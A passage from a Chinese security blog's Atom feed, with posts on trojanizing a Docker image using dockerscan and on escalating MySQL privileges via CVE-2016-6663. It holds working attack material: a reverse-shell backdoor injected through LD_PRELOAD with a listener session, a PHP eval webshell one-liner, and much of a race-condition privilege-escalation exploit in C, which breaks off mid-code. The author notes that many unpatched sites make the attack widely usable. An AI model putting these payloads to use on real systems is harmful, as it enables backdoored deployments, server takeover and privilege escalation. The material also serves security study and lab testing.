      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;最近一段时间尝试研究CmsEasy的安全性，分析了一下“会员编辑资料”功能的小问题。&lt;br&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://blackwolfsec.cc/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://blackwolfsec.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>一款Docker攻击工具dockerscan</title>
    <link href="http://blackwolfsec.cc/2017/05/27/docker-security/"/>
    <id>http://blackwolfsec.cc/2017/05/27/docker-security/</id>
    <published>2017-05-27T09:08:37.000Z</published>
    <updated>2017-07-14T06:28:30.900Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近关注Docker安全，发现一个Docker security analysis &amp; hacking tools-<a href="https://github.com/cr0hn/dockerscan" target="_blank" rel="noopener">dockerscan</a><br><a id="more"></a></p><h2 id="0x01简单实践"><a href="#0x01简单实践" class="headerlink" title="0x01简单实践"></a>0x01简单实践</h2><p>1.下载tutum/lamp<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> pull tutum/lamp</span><br></pre></td></tr></table></figure></p><p>2.导出docker镜像为文件<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">save</span> tutum/lamp -o  tutum_lamp</span><br></pre></td></tr></table></figure></p><p>3.简单分析<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 输入命令</span></span><br><span class="line">dockerscan image info tutum_lamp </span><br><span class="line"><span class="meta"># 输出结果如下</span></span><br><span class="line">[<span class="meta"> * </span>] Starting analyzing docker image...</span><br><span class="line">[<span class="meta"> * </span>] Selected image: <span class="string">'tutum_lamp'</span></span><br><span class="line">[<span class="meta"> * </span>] Analysis finished. Results:</span><br><span class="line">[<span class="meta"> * </span>] - Docker version = <span class="number">1.9</span><span class="number">.1</span></span><br><span class="line">[<span class="meta"> * </span>] - Created date = <span class="number">2016</span><span class="number">-02</span><span class="number">-15</span>T10:<span class="number">35</span>:<span class="number">01.761164611</span>Z</span><br><span class="line">[<span class="meta"> * </span>] - Host name = dfc2eabdf236</span><br><span class="line">[<span class="meta"> * </span>] - Exposed ports:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; <span class="number">3306</span>:</span><br><span class="line">[<span class="meta"> * </span>]     + tcp</span><br><span class="line">[<span class="meta"> * </span>]   &gt; <span class="number">80</span>:</span><br><span class="line">[<span class="meta"> * </span>]     + tcp</span><br><span class="line">[<span class="meta"> * </span>] - Author = Fernando Mayo , Feng Honglin </span><br><span class="line">[<span class="meta"> * </span>] - Cmd = /run.sh</span><br><span class="line">[<span class="meta"> * </span>] - Environment:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">[<span class="meta"> * </span>]   &gt; DEBIAN_FRONTEND=noninteractive</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PHP_UPLOAD_MAX_FILESIZE=<span class="number">10</span>M</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PHP_POST_MAX_SIZE=<span class="number">10</span>M</span><br></pre></td></tr></table></figure></p><p>4.修改镜像，添加trojanize反弹shell<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 输入命令</span></span><br><span class="line">dockerscan image modify trojanize -l <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> -p <span class="number">8888</span> tutum_lamp -o tutum_lamp_modify_trojanize</span><br><span class="line"><span class="meta"># 输出结果如下</span></span><br><span class="line">[<span class="meta"> * </span>] Starting analyzing docker image...</span><br><span class="line">[<span class="meta"> * </span>] Selected image: <span class="string">'tutum_lamp'</span></span><br><span class="line">[<span class="meta"> * </span>] Image troyanized successful</span><br><span class="line">[<span class="meta"> * </span>] Trojanized image location:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; /home/ubuntu/dockerscan/tutum_lamp_modify_trojanize.tar</span><br><span class="line">[<span class="meta"> * </span>] To receive the reverse shell, only write:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; nc -v -k -l <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure></p><p>5.导入新的镜像并运行<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入命令</span></span><br><span class="line">docker load -i tutum_lamp_modify_trojanize.tar</span><br><span class="line">docker <span class="keyword">run</span><span class="bash"> -d tutum/lamp</span></span><br></pre></td></tr></table></figure></p><p>5.控制端监听,获取权限，执行命令<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入命令</span></span><br><span class="line">ubuntu@VM-<span class="number">234</span>-<span class="number">6</span>-<span class="symbol">ubuntu:</span>~$ nc -lvk <span class="number">8888</span></span><br><span class="line"><span class="comment"># 输出结果如下</span></span><br><span class="line">Listening on [<span class="number">0.0</span>.<span class="number">0.0</span>] (family <span class="number">0</span>, port <span class="number">8888</span>)</span><br><span class="line">Connection from [<span class="number">192.168</span>.<span class="number">1.100</span>] port <span class="number">8888</span> [tcp/*] accepted (family <span class="number">2</span>, sport <span class="number">48152</span>)</span><br><span class="line">connecting people</span><br><span class="line">ls</span><br><span class="line">app</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">create_mysql_admin_user.sh</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line"><span class="class"><span class="keyword">lib</span></span></span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">run.sh</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">start-apache2.sh</span><br><span class="line">start-mysqld.sh</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure></p><p>6.再次分析添加trojanize反弹shell后的镜像信息<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">dockerscan image info tutum_lamp_modify_trojanize.tar </span><br><span class="line"><span class="meta"># 输出结果如下</span></span><br><span class="line">[<span class="meta"> * </span>] Starting analyzing docker image...</span><br><span class="line">[<span class="meta"> * </span>] Selected image: <span class="string">'tutum_lamp_modify_trojanize.tar'</span></span><br><span class="line">[<span class="meta"> * </span>] Analysis finished. Results:</span><br><span class="line">[<span class="meta"> * </span>] - Created date = <span class="number">2016</span><span class="number">-02</span><span class="number">-15</span>T10:<span class="number">35</span>:<span class="number">01.761164611</span>Z</span><br><span class="line">[<span class="meta"> * </span>] - Author = Fernando Mayo , Feng Honglin </span><br><span class="line">[<span class="meta"> * </span>] - Cmd = /run.sh</span><br><span class="line">[<span class="meta"> * </span>] - Docker version = <span class="number">1.9</span><span class="number">.1</span></span><br><span class="line">[<span class="meta"> * </span>] - Host name = dfc2eabdf236</span><br><span class="line">[<span class="meta"> * </span>] - Environment:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">[<span class="meta"> * </span>]   &gt; DEBIAN_FRONTEND=noninteractive</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PHP_UPLOAD_MAX_FILESIZE=<span class="number">10</span>M</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PHP_POST_MAX_SIZE=<span class="number">10</span>M</span><br><span class="line">[<span class="meta"> * </span>]   &gt; REMOTE_ADDR=<span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span></span><br><span class="line">[<span class="meta"> * </span>]   &gt; REMOTE_PORT=<span class="number">8888</span></span><br><span class="line">[<span class="meta"> * </span>]   &gt; LD_PRELOAD=/usr/share/lib/reverse_shell.so</span><br><span class="line">[<span class="meta"> * </span>] - Exposed ports:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; <span class="number">80</span>:</span><br><span class="line">[<span class="meta"> * </span>]     + tcp</span><br><span class="line">[<span class="meta"> * </span>]   &gt; <span class="number">3306</span>:</span><br><span class="line">[<span class="meta"> * </span>]     + tcp</span><br></pre></td></tr></table></figure></p><h2 id="0x02原理小结"><a href="#0x02原理小结" class="headerlink" title="0x02原理小结"></a>0x02原理小结</h2><p>1.修改镜像内容copy reverse_shell.so文件到/usr/share/lib/reverse_shell.so，<br>2.添加环境变量REMOTE_ADDR=192.168.1.100，REMOTE_PORT=8888，LD_PRELOAD=/usr/share/lib/reverse_shell.so<br>3.利用LD_PRELOAD预先加载在每次允许docker镜像时反弹shell回来。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;最近关注Docker安全，发现一个Docker security analysis &amp;amp; hacking tools-&lt;a href=&quot;https://github.com/cr0hn/dockerscan&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;dockerscan&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Security" scheme="http://blackwolfsec.cc/categories/Security/"/>
    
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
      <category term="Docker" scheme="http://blackwolfsec.cc/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Mysql提权</title>
    <link href="http://blackwolfsec.cc/2017/05/19/Mysql_Privilege_Escalation/"/>
    <id>http://blackwolfsec.cc/2017/05/19/Mysql_Privilege_Escalation/</id>
    <published>2017-05-19T07:02:39.000Z</published>
    <updated>2017-06-14T01:30:23.625Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>Mysql之前爆出了CVE-2016-6662、CVE-2016-6663、CVE-2016-6664提权漏洞，影响了Mysql小于5.5.51或小于5.6.32或小于5.7.14及衍生版本。然而好多网站都没有升级，利用场景还是很多的，于是实践一下。<br> <a id="more"></a></p><h2 id="0x01环境搭建"><a href="#0x01环境搭建" class="headerlink" title="0x01环境搭建"></a>0x01环境搭建</h2><p>1.采用tutum/lamp的docker作为测试系统环境<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker运行及必要环境配置</span></span><br><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -P tutum/lamp</span></span><br><span class="line"><span class="bash">docker <span class="built_in">exec</span> -it &lt;container_id&gt; /bin/bash</span></span><br><span class="line"><span class="bash">apt update &amp;&amp; apt install -y wget gcc libmysqlclient-dev</span></span><br><span class="line"><span class="bash"><span class="comment"># webshell写入</span></span></span><br><span class="line"><span class="bash"><span class="built_in">echo</span> <span class="string">"&lt;?php @eval(\$_POST[1]);?&gt;"</span> &gt;  /var/www/html/shell.php</span></span><br><span class="line"><span class="bash">chmod -R 777 /var/www/html</span></span><br></pre></td></tr></table></figure></p><p>2.数据库配置<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 添加用户test,密码123456,授予权限<span class="keyword">create</span>,<span class="keyword">drop</span>,<span class="keyword">insert</span>,<span class="keyword">select</span></span><br><span class="line">mysql</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> testdb;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'test'</span>@<span class="string">'%'</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">'123456'</span>; </span><br><span class="line">grant <span class="keyword">create</span>,<span class="keyword">drop</span>,<span class="keyword">insert</span>,<span class="keyword">select</span> <span class="keyword">on</span> testdb.* <span class="keyword">to</span> <span class="string">'test'</span>@<span class="string">'%'</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure></p><h2 id="0x02-www-data权限提升为mysql权限"><a href="#0x02-www-data权限提升为mysql权限" class="headerlink" title="0x02 www-data权限提升为mysql权限"></a>0x02 www-data权限提升为mysql权限</h2><p>利用CVE-2016-6663<br>1.菜刀链接webshell，然后上传需要用到的mysql-privesc-race.c文件，内容如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;grp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mysql.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/inotify.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_PATH          <span class="meta-string">"/tmp/mysql_privesc_exploit"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_DIRN          <span class="meta-string">"mysql_privesc_exploit"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYSQL_TAB_FILE    EXP_PATH <span class="meta-string">"/exploit_table.MYD"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYSQL_TEMP_FILE   EXP_PATH <span class="meta-string">"/exploit_table.TMD"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUID_SHELL     EXP_PATH <span class="meta-string">"/mysql_suid_shell.MYD"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_DELAY 1000    <span class="comment">// can be used in the race to adjust the timing if necessary</span></span></span><br><span class="line"></span><br><span class="line">MYSQL *conn;  <span class="comment">// DB handles</span></span><br><span class="line">MYSQL_RES *res;</span><br><span class="line">MYSQL_ROW row;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intro</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>( </span><br><span class="line">        <span class="string">"\033[94m\n"</span></span><br><span class="line">        <span class="string">"MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n"</span></span><br><span class="line">        <span class="string">"mysql-privesc-race.c (ver. 1.0)\n\n"</span></span><br><span class="line">        <span class="string">"CVE-2016-6663 / CVE-2016-5616\n\n"</span></span><br><span class="line">        <span class="string">"For testing purposes only. Do no harm.\n\n"</span></span><br><span class="line"><span class="string">"Discovered/Coded by:\n\n"</span></span><br><span class="line"><span class="string">"Dawid Golunski \n"</span></span><br><span class="line"><span class="string">"http://legalhackers.com"</span></span><br><span class="line">        <span class="string">"\033[0m\n\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">char</span> *argv0)</span> </span>&#123;</span><br><span class="line">    intro();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Usage:\n\n%s user pass db_host database\n\n"</span>, argv0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mysql_cmd</span><span class="params">(<span class="keyword">char</span> *sql_cmd, <span class="keyword">int</span> silent)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!silent) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s \n"</span>, sql_cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mysql_query(conn, sql_cmd)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(conn));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res = mysql_store_result(conn);</span><br><span class="line">    <span class="keyword">if</span> (res&gt;<span class="number">0</span>) mysql_free_result(res);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> randomnum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> io_notified = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> myd_handle;</span><br><span class="line">    <span class="keyword">int</span> wpid;</span><br><span class="line">    <span class="keyword">int</span> is_shell_suid=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="comment">/* io notify */</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>] __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line">    <span class="keyword">int</span> num_read;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inotify_event</span> *<span class="title">event</span>;</span></span><br><span class="line">    <span class="comment">/* credentials */</span></span><br><span class="line">    <span class="keyword">char</span> *user     = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">char</span> *password = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> *db_host  = argv[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">char</span> *database = argv[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Disable buffering of stdout</span></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the params</span></span><br><span class="line">    <span class="keyword">if</span> (argc!=<span class="number">5</span>) &#123;</span><br><span class="line">usage(argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    intro();</span><br><span class="line">    <span class="comment">// Show initial privileges</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Starting the exploit as: \n"</span>);</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to the database server with provided credentials</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Connecting to the database `%s` as %s@%s\n"</span>, database, user, db_host);</span><br><span class="line">    conn = mysql_init(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!mysql_real_connect(conn, db_host, user, password, database, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(conn));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare tmp dir</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Creating exploit temp directory %s\n"</span>, <span class="string">"/tmp/"</span> EXP_DIRN);</span><br><span class="line">    umask(<span class="number">000</span>);</span><br><span class="line">    system(<span class="string">"rm -rf /tmp/"</span> EXP_DIRN <span class="string">" &amp;&amp; mkdir /tmp/"</span> EXP_DIRN);</span><br><span class="line">    system(<span class="string">"chmod g+s /tmp/"</span> EXP_DIRN );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare exploit tables :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Creating mysql tables \n\n"</span>);</span><br><span class="line">    mysql_cmd(<span class="string">"DROP TABLE IF EXISTS exploit_table"</span>, <span class="number">0</span>);</span><br><span class="line">    mysql_cmd(<span class="string">"DROP TABLE IF EXISTS mysql_suid_shell"</span>, <span class="number">0</span>);</span><br><span class="line">    mysql_cmd(<span class="string">"CREATE TABLE exploit_table (txt varchar(50)) engine = 